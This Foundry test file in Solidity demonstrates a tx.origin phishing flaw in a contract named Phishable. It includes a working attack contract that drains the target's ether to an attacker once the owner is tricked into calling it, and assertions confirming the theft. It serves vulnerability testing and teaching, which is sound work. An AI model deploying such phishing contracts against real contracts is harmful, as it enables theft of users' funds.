
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract AttackContract {
    Phishable public target;
    address payable public attacker;

    constructor(Phishable _target, address payable _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function attack() external {
        target.withdrawAll(attacker);
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public _contractUnderTest;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        _contractUnderTest = new Phishable(owner);
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner since they are the privileged role
        vm.assume(caller != owner);

        // --- 2. State Configuration ---
        // Fund the caller (not strictly necessary for this call, but good practice)
        vm.deal(caller, 1 ether);

        // Record initial balance of the contract
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        uint256 callerBalanceBefore = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // The vulnerability is that tx.origin is used instead of msg.sender
        // An attacker can create a malicious contract that tricks the owner into calling it
        // When the owner calls the attacker's contract, tx.origin will be the owner
        // but msg.sender will be the attacker's contract
        
        // To demonstrate this, we simulate the owner being tricked into calling an attack contract
        AttackContract attackContract = new AttackContract(_contractUnderTest, payable(caller));
        
        // The owner is tricked into calling the attack contract
        // tx.origin will be owner, allowing the withdrawAll to succeed
        vm.prank(owner, owner); // Sets both msg.sender and tx.origin to owner
        attackContract.attack();

        // Assert that the funds were stolen
        assertEq(address(_contractUnderTest).balance, 0, "Contract should be drained");
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore, "Attacker should receive funds");
    }
}
